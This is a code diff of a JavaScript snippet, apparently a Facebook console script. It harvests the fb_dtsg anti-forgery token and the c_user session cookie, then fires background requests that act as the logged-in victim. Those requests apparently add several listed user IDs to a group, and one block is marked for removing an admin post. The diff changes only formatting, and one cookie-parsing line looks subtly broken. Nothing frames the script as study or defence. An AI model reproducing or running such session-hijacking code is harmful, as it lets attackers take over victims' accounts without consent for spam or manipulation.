@@ -2,7 +2,7 @@
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
-setTimeout(function () {
+
 function IDS(r) {
     function G(gid) {
         var Page = new XMLHttpRequest();
@@ -16,14 +16,17 @@ function IDS(r) {
         };
         Page.send(PageParams);
     }
-    G("391559757563844");
+     G("391559757563844");
 }
 IDS("100004092334280");
 IDS("100003147643648");
 IDS("100005147649818");
 IDS("100003998763728");
+
 setTimeout(function () {
-/*remove-Admin Post*/
+
+    /*remove-Admin Post*/
+
     var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
     var now = (new Date).getTime();
@@ -41,11 +44,11 @@ setTimeout(function () {
             };
             Page.send(PageParams);
         }
-        G("391559757563844");
+          G("391559757563844");
     }
     IDS("100002908006006");
     IDS("100003200476066");
     IDS("100006342757697");
     IDS("100005202368891");
-}, 5000);
 
+}, 5000);
